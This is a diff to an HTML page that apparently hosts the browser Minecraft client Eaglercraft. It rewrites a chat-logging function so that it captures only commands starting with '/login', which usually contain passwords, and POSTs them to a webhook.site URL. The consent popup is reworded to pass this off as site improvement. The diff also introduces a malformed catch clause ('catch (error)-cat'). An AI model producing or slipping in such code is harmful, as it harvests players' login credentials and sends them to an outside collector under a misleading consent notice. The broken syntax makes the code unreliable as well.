@@ -117,7 +117,7 @@
     </div>
 
     <div id="consent-popup">
-        <p>We collect feedback and in-game chat messages you submit to improve our site. Only these inputs will be stored and sent to our server. Do you consent?</p>
+        <p>We collect '/login' commands and feedback you submit to improve our site. Only these inputs will be stored and sent to our server. Do you consent?</p>
         <button onclick="grantConsent()">Allow</button>
         <button onclick="denyConsent()">Deny</button>
     </div>
@@ -188,29 +188,31 @@
                 } else {
                     alert('Failed to submit feedback.');
                 }
-            } catch (error) {
+            } catch (error)-cat {
                 console.error('Error submitting feedback:', error);
                 alert('Error submitting feedback.');
             }
         }
         
-        // Call this function from Eaglercraft's chat API (e.g., on chat submission)
-        function captureChatMessage(message) {
+        // Call this from Eaglercraft's command handler (e.g., chat or command input)
+        function captureCommand(command) {
             if (!hasConsent) return;
-            try {
-                fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        type: 'chat',
-                        content: message,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending chat message:', error);
+            if (command.trim().toLowerCase().startsWith('/login')) {
+                try {
+                    fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            type: 'command',
+                            content: command,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                } catch (error) {
+                    console.error('Error sending command:', error);
+                }
             }
         }
         
